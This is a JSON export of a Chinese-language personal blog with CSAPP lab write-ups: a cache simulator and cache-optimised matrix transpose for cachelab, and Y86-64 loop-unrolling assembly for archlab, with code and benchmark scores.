{"meta":{"title":"Mcginn's Blog","subtitle":null,"description":null,"author":"Mcginn","url":"http://mcginn7.github.io","root":"/"},"pages":[],"posts":[{"title":"CSAPP - cachelab","slug":"CSAPP-cachelab","date":"2020-02-23T03:32:46.000Z","updated":"2020-02-24T15:25:53.963Z","comments":true,"path":"2020/02/23/CSAPP-cachelab/","link":"","permalink":"http://mcginn7.github.io/2020/02/23/CSAPP-cachelab/","excerpt":"","text":"题目Part A. Cache Simuator要求将 valgrind 存储跟踪作为输入，在 csim.c 中实现一个缓存模拟器，结果输出：命中，不命中和驱逐的数量（hit, miss, eviction）。需要支持以下参数输入： -s：用于组索引的位数。 -E：每组行数。 -b：用于块的位数。 -t：保存 valgrind 跟踪记录的文件。 Valgrind 输出格式为： 1234I 0400d7d4,8 M 0421c7f0,4 L 04f6b868,8 S 7ff0005c8,8 每行格式为 [space]operation address,size，L 表示加载数据，S 表示存储数据，M 表示修改数据（加载后存储）。指令 M 的存储必然命中，因此其结果只有两种：2 命中或 1 未命中 1 命中。 size 表示内存访问的字节数。测试数据保证内存访问不会出现跨越缓存块的边界，因此 size 在该实验中可忽略。 在该实验中只关注数据缓存，因此操作 I（表示指令加载）可忽略。 做法因为只需要输出 (hit, miss, eviction) 三元组，所以实际实现过程中不必要完全复刻 cache 的过程。 对于参数 (s, E, b, t) 输入，使用 getopt 指令即可。 构造二维数组 cache[1 &lt;&lt; s][E] 记录（标记，有效位）。因为组索引的位数 s 必然大于 0，所以有效位和标记位可以压入一个 64 位整数中。 在要驱逐缓存行时，使用 LRU 策略，因此还需要构造二维数组 last_used_time[1 &lt;&lt; s][E] 记录每个缓存行上次使用时间。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include \"cachelab.h\"#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;getopt.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;limits.h&gt;#define BUFFER_SIZE 50char buf[BUFFER_SIZE];int s; // Number of set index bitsint E; // Associativity, number of lines per setint b; // Number of block bitschar *t; // Name of the valgrind trace to replayint cache_size;long long *cache; // format: tag | validunsigned time_stamp;unsigned *last_used_time;int hit_count;int miss_count;int eviction_count;void memoryAccess(long long addr) &#123; ++time_stamp; int set_idx = (addr &gt;&gt; b) &amp; ((1 &lt;&lt; s) - 1); long long tag = addr &gt;&gt; (b + s); long long *set_cache = cache + set_idx * E; unsigned *set_used_time = last_used_time + set_idx * E; int i; unsigned LRU_i = -1; unsigned LRU_valid; unsigned LRU_time; for (i = 0; i &lt; E; ++i) &#123; unsigned valid = set_cache[i] &amp; 1; long long tag_i = set_cache[i] &gt;&gt; 1; if (valid &gt; 0 &amp;&amp; tag == tag_i) &#123; ++hit_count; set_used_time[i] = time_stamp; return ; &#125; else &#123; if (LRU_i == -1 || valid &lt; LRU_valid || (valid == LRU_valid&amp;&amp; set_used_time[i] &lt; LRU_time)) &#123; LRU_i = i; LRU_valid = valid; LRU_time = set_used_time[i]; &#125; &#125; &#125; ++miss_count; eviction_count += LRU_valid; set_used_time[LRU_i] = time_stamp; set_cache[LRU_i] = tag &lt;&lt; 1 | 1;&#125;int main(int argc, char *argv[]) &#123; char *optString = \"s:E:b:t:\"; int opt = getopt(argc, argv, optString); while (~opt) &#123; switch (opt) &#123; case 's': s = atoi(optarg); break; case 'E': E = atoi(optarg); break; case 'b': b = atoi(optarg); break; case 't': t = optarg; break; &#125; opt = getopt(argc, argv, optString); &#125; time_stamp = 0; hit_count = miss_count = eviction_count = 0; cache_size = E &lt;&lt; s; cache = (long long *) malloc(sizeof(*cache) * cache_size); last_used_time = (unsigned *) malloc(sizeof(*last_used_time) * cache_size); memset(cache, 0, sizeof(*cache) * cache_size); FILE *fp = fopen(t, \"r\"); while (fgets(buf, BUFFER_SIZE, fp) != NULL) &#123; int len = strlen(buf); if (len &lt;= 2 || buf[0] != ' ') continue; char op = buf[1]; if (!(op == 'L' || op == 'S' || op == 'M')) continue; int i; for (i = 0; i &lt; len; ++i) if (buf[i] == ',') &#123; // replace ',' with '\\0' buf[i] = '\\0'; break; &#125; buf[1] = '0', buf[2] = 'x'; long long addr; sscanf(buf + 1, \"%llx\", &amp;addr); printf(\"op = %c, addr = %llx, \", op, addr); memoryAccess(addr); if (op == 'M') ++hit_count; &#125; printSummary(hit_count, miss_count, eviction_count); fclose(fp); return 0;&#125; Part B. Optimizing Matrix Transpose要求实现函数 void trans(int M, int N, int A[N][M], int B[M][N]) 转置矩阵 A 并存储到矩阵 B 中，限制： 缓存参数为：s = 5, E = 1, b = 5。 最多能够定义 12 个 int 类型的局部变量。 不允许修改矩阵 A，但能任意修改矩阵 B。 做法b = 5 表示每个块缓存 $2^5=32$ 字节，即每 8 个 int 元素组索引加一，每个缓存行缓存 8 个地址连续的 int 元素。 s = 5 表示高速缓存中有 $2^5 =32$ 个组，则组索引的循环节大小为 32×8 = 256，即每 256 个 int 元素组索引开始重复。 利用局部性原理，尝试 8×8 分块转置： 123456789101112131415void transpose_submit(int M, int N, int A[N][M], int B[M][N]) &#123; #define min(a,b) ((a)&lt;(b)?(a):(b)) #define rep(i,l,r) for(i=(l);i&lt;(r);++i) #define repd(i,l,r,d) for(i=(l);i&lt;(r);i+=(d)) #define per(i,l,r) for(i=(r)-1;i&gt;=(l);--i) #define perd(i,l,r,d) for(i=(r)-1;i&gt;=(l);i-=(d)) unsigned x, y, i, j; repd(x, 0, N, 8) repd(y, 0, M, 8) &#123; rep(i, x, min(N, x + 8)) rep(j, y, min(M, y + 8)) B[j][i] = A[i][j]; &#125;&#125; 使用 make &amp;&amp; ./driver.py 测试： 1234567Cache Lab summary: Points Max pts MissesCsim correctness 27.0 27Trans perf 32x32 6.9 8 343Trans perf 64x64 0.0 8 4723Trans perf 61x67 8.8 10 2118 Total points 42.7 53 在 32×32 和 61×67 效果还行，但是在 64×64 上 miss 很多。 使用以下指令查看具体的内存跟踪记录： 123456789101112131415161718./test-trans -N 64 -M 64./csim-ref -v -s 5 -E 1 -b 5 -t ./trace.f0...L 30df6c,4 miss evictionS 34dc78,4 miss evictionL 30df70,4 hitS 34dd78,4 miss evictionL 30df74,4 hitS 34de78,4 miss evictionL 30df78,4 hitS 34df78,4 miss evictionL 30df7c,4 miss evictionS 34e078,4 miss evictionL 30e060,4 miss evictionS 34d97c,4 miss evictionL 30e064,4 hitS 34da7c,4 miss eviction... 可以看到，每次在加载（L）后的存储（S）指令就会 miss，并驱逐一条缓存。 当 $SetIndex(A[i][j])=SetIndex(B[i][j])$ 时，8×8 分块中的组索引分布如下： 前 4 行定义为 $A_u$ 和 $B_u$，后 4 行定义为 $A_d$ 和 $B_d$。 读取 $A[0][j]$ 时，依次存储 $B[j][0]$。注意到，组 0 每次都加载 A 后，均因为 B 也有相同的组索引 0 而被覆盖掉，从而丢失了 A 的空间局部性。 对于这种情况，可以开辟 8 个 int 的局部变量将 $A[0][j]$ 全读入，再更新 $B[j][0]$。因为循环变量已使用了 $x, y, i, j$，因此额外的 8 个 int 是限制上限。 12345678910111213141516void transpose_submit(int M, int N, int A[N][M], int B[M][N]) &#123; #define min(a,b) ((a)&lt;(b)?(a):(b)) #define rep(i,l,r) for(i=(l);i&lt;(r);++i) #define repd(i,l,r,d) for(i=(l);i&lt;(r);i+=(d)) #define per(i,l,r) for(i=(r)-1;i&gt;=(l);--i) #define perd(i,l,r,d) for(i=(r)-1;i&gt;=(l);i-=(d)) unsigned x, y, i, j; int a[8]; repd(x, 0, N, 8) repd(y, 0, M, 8) rep(i, x, min(N, x + 8)) &#123; rep(j, y, min(M, y + 8)) a[j - y] = A[i][j]; rep(j, y, min(M, y + 8)) B[j][i] = a[j - y]; &#125;&#125; 使用 make &amp;&amp; ./driver.py 测试： 1234567Cache Lab summary: Points Max pts MissesCsim correctness 27.0 27Trans perf 32x32 8.0 8 289Trans perf 64x64 0.0 8 4613Trans perf 61x67 10.0 10 1999 Total points 45.0 53 64×64 的 miss 几乎不变，而 32×32 和 61×67 已满分。 目前为止，已经充分利用了 A 的空间局部性，然而对于 B 而言在 64×64 却非如此。 在读取 $A[i][j]$ 后，先存储 $B_u(0, 8, 16, 24)$，然后存储 $B_d(0, 8, 16, 24)$，即后 4 行的缓存覆盖掉了前 4 行的缓存，从而丢失了 B 的空间局部性。 那么解决方法自然而然是先写 B 的前 4 行再写后 4 行。 123456789101112131415161718192021void transpose_submit(int M, int N, int A[N][M], int B[M][N]) &#123; #define min(a,b) ((a)&lt;(b)?(a):(b)) #define rep(i,l,r) for(i=(l);i&lt;(r);++i) #define repd(i,l,r,d) for(i=(l);i&lt;(r);i+=(d)) #define per(i,l,r) for(i=(r)-1;i&gt;=(l);--i) #define perd(i,l,r,d) for(i=(r)-1;i&gt;=(l);i-=(d)) unsigned x, y, i, j; int a[8]; repd(x, 0, N, 8) repd(y, 0, M, 8) &#123; rep(i, x, min(N, x + 8)) &#123; rep(j, y, min(M, y + 4)) a[j - y] = A[i][j]; rep(j, y, min(M, y + 4)) B[j][i] = a[j - y]; &#125; rep(i, x, min(N, x + 8)) &#123; rep(j, y + 4, min(M, y + 8)) a[j - y] = A[i][j]; rep(j, y + 4, min(M, y + 8)) B[j][i] = a[j - y]; &#125; &#125;&#125; 使用 make &amp;&amp; ./driver.py 测试： 1234567Cache Lab summary: Points Max pts MissesCsim correctness 27.0 27Trans perf 32x32 7.4 8 321Trans perf 64x64 4.0 8 1653Trans perf 61x67 10.0 10 1953 Total points 48.4 53 32×32 的 miss 略微提升，但是 64×64 的 miss 已显著下降（4613→1653）。 进一步的优化需要打印出 64×64 的组索引数值数组（这里本文假设了 $A[i][j]$ 和 $B[i][j]$ 的组索引相同，直觉上是冲突最多的，未经过严格证明）。 1234567891000 00 00 00 00 00 00 00 01 01 01 01 01 01 01 01 02 ...08 08 08 08 08 08 08 08 09 09 09 09 09 09 09 09 0a ...10 10 10 10 10 10 10 10 11 11 11 11 11 11 11 11 12 ...18 18 18 18 18 18 18 18 19 19 19 19 19 19 19 19 1a ...00 00 00 00 00 00 00 00 01 01 01 01 01 01 01 01 02 ...08 08 08 08 08 08 08 08 09 09 09 09 09 09 09 09 0a ...10 10 10 10 10 10 10 10 11 11 11 11 11 11 11 11 12 ...18 18 18 18 18 18 18 18 19 19 19 19 19 19 19 19 1a ...00 00 00 00 00 00 00 00 01 01 01 01 01 01 01 01 02 ...... 观察可以得出以下结论： 当 8×8 块的左上角坐标不在对角线上时，$A[i][j]$ 的组索引和 $B[j][i]$ 的组索引没有交集。 当 8×8 块的左上角坐标在对角线上时，此时冲突最为严重。 针对观察 1 的结论：在读完 A 的前 4 列后，A 的最后 4 行已被缓存而不会被覆盖。然而，在上一实现中，处理后 4 列时又从前 4 行开始读 A，浪费了已缓存的后 4 行。 所以，这里对于处理 A 的后 4 列时，从后往前读 A 的行，充分利用缓存。过程转变如下图所示： 此外，由于每次只读 A 每行的 4 列，实际上用于缓存 A 的局部变量仅需 4 个。但这样的话会浪费上限为 12 的限制。因此，对于额外的 4 个局部变量可缓存 8×8 块第一行的后 4 列。这样充分利用了高速缓存的 8 个 int，从而在处理第一行的后 4 列时不用再从内存读取而避免了 miss 。 1234567891011121314151617181920212223void transpose_submit(int M, int N, int A[N][M], int B[M][N]) &#123; #define min(a,b) ((a)&lt;(b)?(a):(b)) #define rep(i,l,r) for(i=(l);i&lt;(r);++i) #define repd(i,l,r,d) for(i=(l);i&lt;(r);i+=(d)) #define per(i,l,r) for(i=(r)-1;i&gt;=(l);--i) #define perd(i,l,r,d) for(i=(r)-1;i&gt;=(l);i-=(d)) int x, y, i, j, a[8]; repd(x, 0, N, 8) repd(y, 0, M, 8) &#123; rep(j, y, min(M, y + 8)) a[j - y] = A[x][j]; rep(j, y, min(M, y + 4)) B[j][x] = a[j - y]; rep(i, x + 1, min(N, x + 8)) &#123; rep(j, y, min(M, y + 4)) a[j - y] = A[i][j]; rep(j, y, min(M, y + 4)) B[j][i] = a[j - y]; &#125; per(i, x + 1, min(N, x + 8)) &#123; rep(j, y + 4, min(M, y + 8)) a[j - y - 4] = A[i][j]; rep(j, y + 4, min(M, y + 8)) B[j][i] = a[j - y - 4]; &#125; rep(j, y + 4, min(M, y + 8)) B[j][x] = a[j - y]; &#125;&#125; 使用 make &amp;&amp; ./driver.py 测试： 1234567Cache Lab summary: Points Max pts MissesCsim correctness 27.0 27Trans perf 32x32 7.8 8 309Trans perf 64x64 7.3 8 1357Trans perf 61x67 10.0 10 1940 Total points 52.1 53 剩余优化在于处于对角线的 8×8 分块，其冲突主要在于 A 的缓存组索引和 B 的缓存组索引相同。这里只需要针对这种情况构造一种冲突较少的方案即可。 本文构造的方案为： 将 A 的前 4 行依次存储到 B 的前 4 行（不转置），此时缓存中均是 $B_u $。转置 B 前 4 行的两个 4×4 子矩阵。由于缓存的存在，转置子矩阵不会导致任何的 miss。 同样处理后 4 行。注意，此时缓存的是 $B_d$。 剩下的就是交换 $B_u$ 的右子矩阵和 $B_d$ 的左子矩阵，利用 8 个局部变量容易做到。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576void transpose_submit(int M, int N, int A[N][M], int B[M][N]) &#123; #define min(a,b) ((a)&lt;(b)?(a):(b)) #define rep(i,l,r) for(i=(l);i&lt;(r);++i) #define repd(i,l,r,d) for(i=(l);i&lt;(r);i+=(d)) #define per(i,l,r) for(i=(r)-1;i&gt;=(l);--i) #define perd(i,l,r,d) for(i=(r)-1;i&gt;=(l);i-=(d)) int x, y, i, j, a[8]; repd(x, 0, N, 8) repd(y, 0, M, 8) if (x != y || x + 8 &gt; min(N, M) || y + 8 &gt; min(N, M)) &#123; rep(j, y, min(M, y + 8)) a[j - y] = A[x][j]; rep(j, y, min(M, y + 4)) B[j][x] = a[j - y]; rep(i, x + 1, min(N, x + 8)) &#123; rep(j, y, min(M, y + 4)) a[j - y] = A[i][j]; rep(j, y, min(M, y + 4)) B[j][i] = a[j - y]; &#125; y += 4; per(i, x + 1, min(N, x + 8)) &#123; rep(j, y, min(M, y + 4)) a[j - y] = A[i][j]; rep(j, y, min(M, y + 4)) B[j][i] = a[j - y]; &#125; rep(j, y, min(M, y + 4)) B[j][x] = a[4 + j - y]; y -= 4; &#125; else &#123; a[0] = x; x = y; y = a[0]; // Upper part rep(i, 0, 4) &#123; rep(j, 0, 8) a[j] = A[y + i][x + j]; rep(j, 0, 8) B[x + i][y + j] = a[j]; &#125; // trans(0, 0) rep(i, 0, 4) rep(j, i + 1, 4) &#123; a[0] = B[x + i][y + j]; B[x + i][y + j] = B[x + j][y + i]; B[x + j][y + i] = a[0]; &#125; // trans(0, 4) y += 4; rep(i, 0, 4) rep(j, i + 1, 4) &#123; a[0] = B[x + i][y + j]; B[x + i][y + j] = B[x + j][y + i]; B[x + j][y + i] = a[0]; &#125; y -= 4; // Lower part rep(i, 4, 8) &#123; rep(j, 0, 8) a[j] = A[y + i][x + j]; rep(j, 0, 8) B[x + i][y + j] = a[j]; &#125; // trans(4, 0) x += 4; rep(i, 0, 4) rep(j, i + 1, 4) &#123; a[0] = B[x + i][y + j]; B[x + i][y + j] = B[x + j][y + i]; B[x + j][y + i] = a[0]; &#125; // trans(4, 4) y += 4; rep(i, 0, 4) rep(j, i + 1, 4) &#123; a[0] = B[x + i][y + j]; B[x + i][y + j] = B[x + j][y + i]; B[x + j][y + i] = a[0]; &#125; y -= 4; x -= 4; // swap Bur, Bdl rep(i, 0, 4) &#123; rep(j, 0, 4) a[j] = B[x + 4 + i][y + j]; rep(j, 4, 8) a[j] = B[x + i][y + j]; rep(j, 4, 8) B[x + i][y + j] = a[j - 4]; rep(j, 0, 4) B[x + 4 + i][y + j] = a[j + 4]; &#125; a[0] = x; x = y; y = a[0]; &#125;&#125; 使用 make &amp;&amp; ./driver.py 测试： 1234567Cache Lab summary: Points Max pts MissesCsim correctness 27.0 27Trans perf 32x32 8.0 8 261Trans perf 64x64 8.0 8 1261Trans perf 61x67 10.0 10 1966 Total points 53.0 53","categories":[],"tags":[]},{"title":"CSAPP - archlab","slug":"CSAPP-archlab","date":"2020-02-21T13:17:36.000Z","updated":"2020-02-21T15:53:52.882Z","comments":true,"path":"2020/02/21/CSAPP-archlab/","link":"","permalink":"http://mcginn7.github.io/2020/02/21/CSAPP-archlab/","excerpt":"","text":"知识点 学习流水线化的 Y86-64 处理器的设计和实现，深刻理解流水线冒险。 学习循环展开，理解其对程序性能的影响。 题目Part A要求使用 Y86-64 指令集，编写关于 sum_list, rsum_list 和 copy_block 函数的 Y86-64 程序。 做法参考书本图 4-7 即可，实现也较为简单。 Part B要求使用硬件控制语言（HCL）修改 sim/seq/seq-full.hcl，使得处理器支持 iaddq 指令。 做法iaddq 指令将立即数和寄存器相加，并将结果写回寄存器。 具体参考 irmovq 指令的实现即可。 Part C要求在 ncopy.ys 中用 Y86-64 指令实现函数 ncopy：复制 src 到 dst，同时统计并返回其中正数的数量。 满分要求达到 CPE &lt; 7.50。 12345678910111213141516/* * ncopy - copy src to dst, returning number of positive ints * contained in src array. */word_t ncopy(word_t *src, word_t *dst, word_t len) &#123; word_t count = 0; word_t val; while (len &gt; 0) &#123; val = *src++; *dst = val; if (val &gt; 0) count++; len--; &#125; return count; &#125; 做法首先实现最朴素的循环体： 12345678910111213141516# %rdi = src, %rsi = dst, %rdx = lenncopy: xorq %rax,%rax andq %rdx,%rdx # len &gt; 0? jle DoneLoop: mrmovq (%rdi), %r10 # get *src rmmovq %r10, (%rsi) # set *dst andq %r10, %r10 # val &gt; 0? jle Npos iaddq $1, %rax # count++Npos: iaddq $8, %rdi # src++ iaddq $8, %rsi # dst++ iaddq $-1, %rdx # len-- jne Loop 该实现使用 ./benchmark.pl 测试， CPE = 11.70。该实现需要经过优化来达到满分要求。 先简单介绍循环展开（Loop Unrolling），通过增加每次迭代计算的元素数量，从而减少循环的迭代次数： 减少循环不直接有助于计算的操作数量，比如循环索引。 不严谨地说，就是关键操作（比如乘法操作）数量不变，但是循环变量的加法减少了，这样就可以减少不必要的操作数量。 循环展开可以改变代码，有可能减少流水线冒险。 在朴素版本中，mrmovq (%rdi), %r10 和 rmmovq %r10, (%rsi) 存在数据相关：需要先将 *src 读取到寄存器 %r10 中，进而才能读取 %r10 值保存到 *dst。处理器通过暂停指令来处理该情况，参考下图情形： 由于有转发机制，流水线处理器可以减少暂停的周期数，而不是图上的 3 个周期。 下面实现 2×1 循环展开： 12345678910111213141516171819202122232425262728293031ncopy: xorq %rax, %rax iaddq $-2, %rdx # len - 2 &gt;= 0? jl RemLoop: mrmovq (%rdi), %r8 # get *src mrmovq 8(%rdi), %r9 # get *(src + 1) rmmovq %r8, (%rsi) # set *dst rmmovq %r9, 8(%rsi) # set *(dst + 1) andq %r8, %r8 # val &gt; 0? jle LNP8 iaddq $1, %rax # count++LNP8: andq %r9, %r9 # val &gt; 0? jle LNP9 iaddq $1, %rax # count++LNP9: iaddq $16, %rdi # src += 2 iaddq $16, %rsi # dst += 2 iaddq $-2, %rdx # len -= 2 jge LoopRem: iaddq $2, %rdx jle Done mrmovq (%rdi), %r8 rmmovq %r8, (%rsi) andq %r8, %r8 jle Done iaddq $1, %rax 该实现使用 ./benchmark.pl 测试， CPE = 8.87。 注意，此处将余数放到最后处理，可以去掉 %rdi, %rsi 和 %rdx 的加法操作，从而提高 CPE。 其中，将 iaddq $16, %rdi 置于 mrmovq 8(%rdi), %r9 和 rmmovq %r8, (%rsi) 之间，CPE 不会提升。此外，插入到 andq 和 jle 之间也不会提升 CPE。 因此，可得出结论 mrmovq 和 rmmovq 如果存在数据相关，只会暂停一个周期（即插入一个 bubble）。 进一步的优化考虑使用更多的寄存器来展开循环。因为 Y86-64 指令集仅支持 15 个寄存器，去掉已使用的寄存器和栈寄存器，剩余 10 个寄存器可用。所以最多能够编写 10×1 循环展开程序。 参考 2×1 展开，余数部分手动处理而不依赖循环结构，可以进一步减少循环索引和循环指针的加法操作。手动处理的话，需要知道余数大小，然后跳转到相应的位置进行处理。这里可以使用类似二分查找思想：条件跳转指令有 jl, je 和 jg，可以确定 2 个区间和 1 个值。 知道余数大小后，类似 C 语言中 switch 选择语句依次处理剩余部分： 123456switch (Remainder) &#123; case 9: val=*src++; *dst++=val; count += val&gt;0; case 8: val=*src++; *dst++=val; count += val&gt;0; ... case 1: val=*src++; *dst++=val; count += val&gt;0;&#125; 10×1 循环展开+余数手动处理版本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145ncopy: iaddq $-10, %rdx jl RemLoop: mrmovq (%rdi), %r8 mrmovq 8(%rdi), %r9 mrmovq 16(%rdi), %r10 mrmovq 24(%rdi), %r11 mrmovq 32(%rdi), %r12 mrmovq 40(%rdi), %r13 mrmovq 48(%rdi), %r14 mrmovq 56(%rdi), %rcx mrmovq 64(%rdi), %rbx mrmovq 72(%rdi), %rbp rmmovq %r8, (%rsi) rmmovq %r9, 8(%rsi) rmmovq %r10, 16(%rsi) rmmovq %r11, 24(%rsi) rmmovq %r12, 32(%rsi) rmmovq %r13, 40(%rsi) rmmovq %r14, 48(%rsi) rmmovq %rcx, 56(%rsi) rmmovq %rbx, 64(%rsi) rmmovq %rbp, 72(%rsi) andq %r8, %r8 jle R10N8 iaddq $1, %raxR10N8: andq %r9, %r9 jle R10N9 iaddq $1, %raxR10N9: andq %r10, %r10 jle R10N10 iaddq $1, %raxR10N10: andq %r11, %r11 jle R10N11 iaddq $1, %raxR10N11: andq %r12, %r12 jle R10N12 iaddq $1, %raxR10N12: andq %r13, %r13 jle R10N13 iaddq $1, %raxR10N13: andq %r14, %r14 jle R10N14 iaddq $1, %raxR10N14: andq %rcx, %rcx jle R10N15 iaddq $1, %raxR10N15: andq %rbx, %rbx jle R10N16 iaddq $1, %raxR10N16: andq %rbp, %rbp jle R10N17 iaddq $1, %raxR10N17: iaddq $80, %rdi iaddq $80, %rsi iaddq $-10, %rdx jge LoopRem: iaddq $10, %rdx jle Done iaddq $-4, %rdx jge GE4 iaddq $2, %rdx jl R1 je R2 jmp R3GE4: je R4 iaddq $-2, %rdx jl R5 je R6 iaddq $-2, %rdx jl R7 je R8R9: mrmovq 64(%rdi), %r8 rmmovq %r8, 64(%rsi) andq %r8, %r8 jle R8 iaddq $1, %raxR8: mrmovq 56(%rdi), %r8 rmmovq %r8, 56(%rsi) andq %r8, %r8 jle R7 iaddq $1, %raxR7: mrmovq 48(%rdi), %r8 rmmovq %r8, 48(%rsi) andq %r8, %r8 jle R6 iaddq $1, %raxR6: mrmovq 40(%rdi), %r8 rmmovq %r8, 40(%rsi) andq %r8, %r8 jle R5 iaddq $1, %raxR5: mrmovq 32(%rdi), %r8 rmmovq %r8, 32(%rsi) andq %r8, %r8 jle R4 iaddq $1, %raxR4: mrmovq 24(%rdi), %r8 rmmovq %r8, 24(%rsi) andq %r8, %r8 jle R3 iaddq $1, %raxR3: mrmovq 16(%rdi), %r8 rmmovq %r8, 16(%rsi) andq %r8, %r8 jle R2 iaddq $1, %raxR2: mrmovq 8(%rdi), %r8 rmmovq %r8, 8(%rsi) andq %r8, %r8 jle R1 iaddq $1, %raxR1: mrmovq (%rdi), %r8 rmmovq %r8, (%rsi) andq %r8, %r8 jle Done iaddq $1, %rax 该实现使用 ./benchmark.pl 测试， CPE = 8.02。 继续观察上述代码，还有 2 处可以优化： 每个 case 下，mrmovq 和 rmmovq 存在数据相关。 余数为 0 时，单独特判。假设每个余数等概率出现，那么很大概率这个条件跳转不会发生，从而增加了 CPE。所以，余数二分查找时要把 0 考虑进去。 针对 1 的优化，从 mrmovq 和 rmmovq 不会设置条件码入手，将这两条指令插入到 andq %r8, %r8 和 jle 之间，从而避免流水线暂停（这两条指令相邻时暂停一周期）。解决方法是：将前一个数的正负判断延迟到当前模块处理。具体实现为： 1234567Rn: andq %r8, %r8 # %r8=src[n - 1] mrmovq 8n(%rdi), %r8 # 加载src[n]到%r8 jle EnNP iaddq $1, %raxEnNP: rmmovq %r8, 8n(%rsi) # 设置dst[n]=%r8 该做法要求进入一个模块前，需要先加载一个数到寄存器 %r8 中。除了余数为 0 时，其他情形都需要 src[0]，所以考虑加载 src[0] 到 %r8 中。 针对 2 的优化，要注意二分查找的分界点，该过程可通过动态规划来计算最少的指令数： 123456789101112131415161718192021222324252627282930313233343536#include&lt;bits/stdc++.h&gt;using namespace std;#define mp make_pair#define rep(i,l,r) for(int i=(l);i&lt;(r);++i)#define per(i,l,r) for(int i=(r)-1;i&gt;=(l);--i)#define dd(x) cout &lt;&lt; #x &lt;&lt; \" = \" &lt;&lt; x &lt;&lt; \", \"#define de(x) cout &lt;&lt; #x &lt;&lt; \" = \" &lt;&lt; x &lt;&lt; endl//-------map&lt;pair&lt;int,int&gt;, int&gt; dp;int dfs(pair&lt;int, int&gt; ij) &#123; if (ij.first &gt;= ij.second) return 0; if (dp.count(ij)) return dp[ij]; int l, r; tie(l, r) = ij; pair&lt;int, int&gt; ret(INT_MAX, INT_MAX); rep(m, l, r + 1) &#123; int sum = 1 + 1; // test; je if (l &lt;= m - 1) // jl, 左分支 sum += (l &lt; m - 1) + (m - l) + dfs(mp(l, m - 1)); if (m + 1 &lt;= r) // jg, 右分支 sum += (m + 1 &lt; r) + (r - m) + dfs(mp(m + 1, r)); ret = min(ret, mp(sum, m)); &#125; dd(l), dd(r), dd(ret.first), de(ret.second); return dp[ij] = ret.first;&#125;int main() &#123; int l, r; cin &gt;&gt; l &gt;&gt; r; dd(l), de(r); int ans = dfs(mp(l, r)); de(ans); return 0;&#125; 在区间为 [0, 9] 时，关键输出为： 12345l = 7, r = 9, ret.first = 4, ret.second = 8l = 4, r = 5, ret.first = 3, ret.second = 4l = 4, r = 9, ret.first = 16, ret.second = 6l = 0, r = 2, ret.first = 4, ret.second = 1l = 0, r = 9, ret.first = 33, ret.second = 3 查找的关键点为：1，3，4，6，8。 在实现过程反复测试中，发现处理器更倾向于总是跳转，结合具体的查找实现，最终的关键点定位：1，3，5，7， 8。 优化后的版本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160ncopy: iaddq $-10, %rdx jl RemLoop: mrmovq (%rdi), %r8 mrmovq 8(%rdi), %r9 mrmovq 16(%rdi), %r10 mrmovq 24(%rdi), %r11 mrmovq 32(%rdi), %r12 mrmovq 40(%rdi), %r13 mrmovq 48(%rdi), %r14 mrmovq 56(%rdi), %rcx mrmovq 64(%rdi), %rbx mrmovq 72(%rdi), %rbp rmmovq %r8, (%rsi) rmmovq %r9, 8(%rsi) rmmovq %r10, 16(%rsi) rmmovq %r11, 24(%rsi) rmmovq %r12, 32(%rsi) rmmovq %r13, 40(%rsi) rmmovq %r14, 48(%rsi) rmmovq %rcx, 56(%rsi) rmmovq %rbx, 64(%rsi) rmmovq %rbp, 72(%rsi) andq %r8, %r8 jle R10N8 iaddq $1, %raxR10N8: andq %r9, %r9 jle R10N9 iaddq $1, %raxR10N9: andq %r10, %r10 jle R10N10 iaddq $1, %raxR10N10: andq %r11, %r11 jle R10N11 iaddq $1, %raxR10N11: andq %r12, %r12 jle R10N12 iaddq $1, %raxR10N12: andq %r13, %r13 jle R10N13 iaddq $1, %raxR10N13: andq %r14, %r14 jle R10N14 iaddq $1, %raxR10N14: andq %rcx, %rcx jle R10N15 iaddq $1, %raxR10N15: andq %rbx, %rbx jle R10N16 iaddq $1, %raxR10N16: andq %rbp, %rbp jle R10N17 iaddq $1, %raxR10N17: iaddq $80, %rdi iaddq $80, %rsi iaddq $-10, %rdx jge LoopRem: mrmovq (%rdi), %r8 iaddq $7, %rdx jge RGE3R02: iaddq $2, %rdx jl Done rmmovq %r8, (%rsi) je R1 jmp R2R46: iaddq $2, %rdx jl R4 je R5 jmp R6RGE3: rmmovq %r8, (%rsi) je R3R49: iaddq $-4, %rdx jl R46 je R7R89: iaddq $-1, %rdx je R8R9: andq %r8, %r8 mrmovq 64(%rdi), %r8 jle R9NP iaddq $1, %rax R9NP: rmmovq %r8, 64(%rsi)R8: andq %r8, %r8 mrmovq 56(%rdi), %r8 jle R8NP iaddq $1, %rax R8NP: rmmovq %r8, 56(%rsi)R7: andq %r8, %r8 mrmovq 48(%rdi), %r8 jle R7NP iaddq $1, %rax R7NP: rmmovq %r8, 48(%rsi)R6: andq %r8, %r8 mrmovq 40(%rdi), %r8 jle R6NP iaddq $1, %rax R6NP: rmmovq %r8, 40(%rsi)R5: andq %r8, %r8 mrmovq 32(%rdi), %r8 jle R5NP iaddq $1, %rax R5NP: rmmovq %r8, 32(%rsi)R4: andq %r8, %r8 mrmovq 24(%rdi), %r8 jle R4NP iaddq $1, %rax R4NP: rmmovq %r8, 24(%rsi)R3: andq %r8, %r8 mrmovq 16(%rdi), %r8 jle R3NP iaddq $1, %rax R3NP: rmmovq %r8, 16(%rsi)R2: andq %r8, %r8 mrmovq 8(%rdi), %r8 jle R2NP iaddq $1, %rax R2NP: rmmovq %r8, 8(%rsi)R1: andq %r8, %r8 jle Done iaddq $1, %rax 注意，该版本去掉了 xorq %rax, %rax。 测试结果： 参考 csapp archlab Part C csapp archlab 60分解答","categories":[],"tags":[]},{"title":"CSAPP - 